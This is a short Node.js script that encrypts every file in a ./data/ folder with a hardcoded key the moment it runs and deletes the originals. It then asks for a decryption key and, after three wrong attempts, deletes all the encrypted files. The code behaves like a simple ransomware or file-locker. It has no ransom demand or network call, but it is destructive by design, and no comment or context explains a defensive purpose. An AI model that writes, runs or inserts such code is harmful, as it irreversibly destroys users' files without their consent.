const encryptor = require("file-encryptor");
const fs = require("fs");
const readline = require("readline");

const folderPath = "./data/";
const secretKey = "This is a secret";
let decryptionKey = "";
let decryptionAttempts = 0;
const MAX_ATTEMPTS = 3;

async function encryptFile(inputPath, outputPath) {
  return new Promise((resolve) => {
    encryptor.encryptFile(inputPath, outputPath, secretKey, (err) => {
      if (err) {
        console.error("Encryption error:", err);
      } else {
        fs.unlinkSync(inputPath);
        console.log(`Encryption of ${inputPath} is complete.`);
      }
      resolve();
    });
  });
}

async function decryptFile(inputPath, outputPath) {
  return new Promise((resolve) => {
    encryptor.decryptFile(inputPath, outputPath, decryptionKey, (err) => {
      if (err) {
        console.error("Decryption error:", err);
      } else {
        fs.unlinkSync(inputPath);
        console.log(`Decryption of ${inputPath} is complete.`);
      }
      resolve();
    });
  });
}

async function processFiles(encrypt) {
  const files = fs.readdirSync(folderPath);
  for (const file of files) {
    const inputPath = `${folderPath}${file}`;
    const outputExtension = encrypt === "encrypt" ? ".encrypted" : "";
    const outputPath = `${folderPath}${file}${outputExtension}`;

    if (encrypt === "encrypt") {
      await encryptFile(inputPath, outputPath);
    } else if (encrypt === "decrypt") {
      await decryptFile(inputPath, outputPath.replace(".encrypted", ""));
    }
  }
}

function promptKey(encrypt) {
  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
  });

  rl.question(`Enter ${encrypt}ion key: `, (keyAnswer) => {
    rl.close();
    if (keyAnswer === secretKey) {
      console.log(`${encrypt.charAt(0).toUpperCase() + encrypt.slice(1)}ing files...`);
      decryptionKey = keyAnswer;
      processFiles(encrypt);
    } else {
      decryptionAttempts++;
      if (decryptionAttempts < MAX_ATTEMPTS) {
        console.log(
          `Incorrect ${encrypt}ion key. ${
            MAX_ATTEMPTS - decryptionAttempts
          } attempts remaining. Please try again.`
        );
        promptKey(encrypt);
      } else {
        console.log(
          `Exceeded maximum ${encrypt}ion attempts. Deleting ${encrypt}ed files...`
        );
        deleteFiles(".encrypted");
      }
    }
  });
}

function deleteFiles(extension) {
  fs.readdirSync(folderPath).forEach((file) => {
    if (file.endsWith(extension)) {
      fs.unlinkSync(`${folderPath}${file}`);
      console.log(`Deleted ${extension} file ${file}.`);
    }
  });
}

console.log("Encrypting files...");
processFiles("encrypt").then(() => {
  promptKey("decrypt");
});
